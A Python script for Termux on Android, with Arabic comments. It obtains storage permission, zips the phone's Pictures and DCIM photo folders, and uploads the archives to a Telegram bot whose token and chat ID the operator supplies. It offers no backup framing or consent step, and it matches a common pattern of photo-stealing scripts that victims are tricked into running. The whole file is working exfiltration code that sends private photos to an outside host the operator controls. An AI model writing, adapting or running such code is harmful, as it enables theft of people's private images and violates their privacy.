import os
import requests
import zipfile
import time

# ألوان للإخراج
GREEN = "\033[92m"
RED = "\033[91m"
RESET = "\033[0m"

# بيانات بوت تلغرام (يجب استبدالها ببياناتك الخاصة)
BOT_TOKEN = "YOUR_BOT_TOKEN"  # استبدل هذا برمز بوتك
CHAT_ID = "YOUR_CHAT_ID"      # استبدل هذا بمعرف الدردشة

# دالة لإرسال ملف إلى بوت تلغرام
def send_to_telegram(file_path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(file_path, "rb") as file:
            files = {"document": file}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, data=data, files=files)
        return response.status_code == 200
    except Exception:
        return False

# دالة لضغط الملفات في مجلد معين إلى ملف ZIP
def compress_folder_to_zip(folder_path, zip_file_path):
    try:
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(folder_path):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, folder_path)
                    zipf.write(file_path, arcname)
        print(f"Folder compressed successfully: {zip_file_path}")
        return True
    except Exception as e:
        print(f"Failed to compress folder: {e}")
        return False

# دالة لجمع الملفات من مجلد معين وضغطها وإرسالها
def process_and_send_folder(folder_path, folder_name):
    if os.path.exists(folder_path):
        # تحديد اسم ملف ZIP
        zip_file_name = f"{folder_name}.zip"
        zip_file_path = os.path.join("/data/data/com.termux/files/home", zip_file_name)

        # ضغط المجلد
        if compress_folder_to_zip(folder_path, zip_file_path):
            # إرسال ملف ZIP إلى بوت تلغرام
            if send_to_telegram(zip_file_path):
                print(f"Compressed file sent: {zip_file_name}")
            else:
                print(f"Failed to send compressed file: {zip_file_name}")
        else:
            print(f"Failed to compress folder: {folder_path}")
    else:
        print(f"Folder not found: {folder_path}")

# دالة لتشغيل termux-setup-storage والتأكد من الأذونات
def setup_termux_storage():
    print(f"{GREEN}Setting up storage permissions...{RESET}")
    os.system("termux-setup-storage")
    # الانتظار حتى يتم إنشاء مجلد storage
    while not os.path.exists("/data/data/com.termux/files/home/storage"):
        print(f"{RED}Waiting for storage permissions...{RESET}")
        time.sleep(5)
    print(f"{GREEN}Storage permissions granted!{RESET}")

# الدالة الرئيسية
def main():
    # تشغيل termux-setup-storage
    setup_termux_storage()

    # مجلدات للضغط والإرسال
    folders_to_process = [
        ("/data/data/com.termux/files/home/storage/dcim/Pictures", "Pictures"),
        ("/data/data/com.termux/files/home/storage/dcim/DCIM", "DCIM")
    ]

    # معالجة كل مجلد على حدة
    for folder_path, folder_name in folders_to_process:
        print(f"Processing folder: {folder_name}")
        process_and_send_folder(folder_path, folder_name)

if __name__ == "__main__":
    main()